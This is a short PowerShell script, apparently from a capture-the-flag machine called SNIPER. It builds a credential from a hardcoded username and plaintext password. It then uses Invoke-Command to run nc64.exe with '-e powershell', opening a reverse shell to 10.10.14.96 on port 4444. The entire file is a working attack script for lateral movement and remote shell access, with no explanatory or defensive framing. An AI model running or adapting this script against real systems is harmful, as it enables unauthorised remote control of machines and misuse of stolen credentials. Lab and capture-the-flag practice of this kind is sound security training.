$username = 'SNIPER\Chris'
$password = '36mEAhz/B8xQ~2VM'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Invoke-command -computername SNIPER -credential $credential -scriptblock { cmd.exe /c "C:\tmp\nc64.exe" -e powershell 10.10.14.96 4444 }
